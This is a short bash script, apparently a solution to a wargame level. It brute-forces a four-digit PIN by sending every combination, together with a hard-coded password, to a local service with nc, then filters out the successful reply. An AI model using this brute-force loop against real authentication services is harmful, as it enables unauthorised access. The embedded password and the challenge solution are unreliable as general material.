#!/bin/bash 

function ctrl_c(){

	echo -e "\n\nSaliendo ..! \n"
	exit 1
}

trap ctrl_c SIGINT 

function get_pincode(){
	for p in $(seq -w 0000 9999); do
		echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $p" 
	done
}

get_pincode | nc localhost 30002 | grep -vE "Wrong|I am" | tail -n 2 | awk 'NF{print $NF}'
